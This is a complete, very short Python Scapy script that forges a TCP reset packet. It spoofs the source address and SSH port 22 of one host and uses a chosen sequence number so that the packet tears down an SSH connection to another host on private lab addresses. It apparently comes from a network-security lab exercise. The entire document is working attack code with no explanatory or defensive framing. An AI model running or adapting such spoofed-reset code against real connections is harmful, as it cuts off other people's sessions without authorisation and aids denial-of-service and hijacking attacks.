from scapy.all import *
ip=IP(src="10.0.2.5",dst="10.0.2.15")
tcp=TCP(sport=22,dport=58642,flags="R",seq=4216929186)
pkt=ip/tcp
send(pkt)